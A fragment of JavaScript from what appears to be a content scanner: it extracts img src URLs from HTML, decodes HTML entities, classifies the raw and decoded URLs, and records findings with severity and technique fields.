    // src may be in group 1 (double-quoted), 2 (single-quoted), or 3 (bare).
    let rawUrl = m[1] || m[2] || m[3] || "";
    let groupIdx = m[1] ? 1 : m[2] ? 2 : 3;
    if (!m.indices[groupIdx]) continue;
    const [urlStart] = m.indices[groupIdx];
    const rawVerdict = classifyUrl(rawUrl);
    if (rawVerdict) {
      findings.push(
        buildFinding("html-img", rawUrl, urlStart, rawVerdict.severity, rawVerdict.technique, rawVerdict.meta)
      );
      continue;
    }
    // Fast-path skip: if there's no `&` in the raw token, entity decoding is
    // a no-op — bail out early to keep cost zero on benign corpora.
    if (!rawUrl.includes("&")) continue;
    const decodedOnce = decodeBasicHtmlEntities(rawUrl);
    const decoded = stripDecodedSurroundingQuotes(decodedOnce);
    if (decoded === rawUrl) continue;
    const decodedVerdict = classifyUrl(decoded);
    if (!decodedVerdict) continue;
    // R12: technique stays fixed-phrase (it's already one of the 4 detector-
    // controlled strings from classifyUrl). We only add `entityDecoded: true`
    // to meta so the UI can flag the path.
    const meta = { ...(decodedVerdict.meta || {}), entityDecoded: true };
    // R13: bracket contract — anchor on the RAW src token span in `content`.
    // The finding `content` body comes from buildFinding(rawUrl, ...) so the
    // displayed string echoes the raw entity-encoded token, not the decoded
    // URL.
    findings.push(
      buildFinding("html-img", rawUrl, urlStart, decodedVerdict.severity, decodedVerdict.technique, meta)
    );
  }

  return findings;
}
